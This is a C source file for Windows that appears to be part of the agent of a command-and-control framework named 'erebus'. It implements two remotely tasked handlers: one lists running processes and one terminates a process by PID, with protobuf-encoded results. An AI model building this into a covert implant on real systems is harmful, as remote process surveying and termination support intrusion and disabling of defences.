#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/task_handlers.h"

int erebus_task_process_list(uint8_t **out, size_t *out_len) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    size_t cap = 64;
    size_t count = 0;
    erebus_process_info *procs = (erebus_process_info *)calloc(cap, sizeof(*procs));
    if (!procs) { CloseHandle(snap); return 0; }

    if (Process32First(snap, &pe)) {
        do {
            if (count >= cap) {
                cap *= 2;
                erebus_process_info *n = (erebus_process_info *)realloc(procs, cap * sizeof(*procs));
                if (!n) { free(procs); CloseHandle(snap); return 0; }
                procs = n;
            }
            procs[count].pid = pe.th32ProcessID;
            procs[count].ppid = pe.th32ParentProcessID;
            strncpy(procs[count].name, pe.szExeFile, sizeof(procs[count].name) - 1);
            count++;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    int ok = erebus_pb_encode_process_list_result(procs, count, out, out_len);
    free(procs);
    return ok;
}

int erebus_task_process_kill(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_process_kill_task task;
    if (!erebus_pb_decode_process_kill_task(data, data_len, &task) || !task.pid)
        return 0;

    HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, task.pid);
    if (!hp) return erebus_pb_encode_process_kill_result(0, out, out_len);

    BOOL ok = TerminateProcess(hp, 1);
    CloseHandle(hp);
    return erebus_pb_encode_process_kill_result(ok ? 1 : 0, out, out_len);
}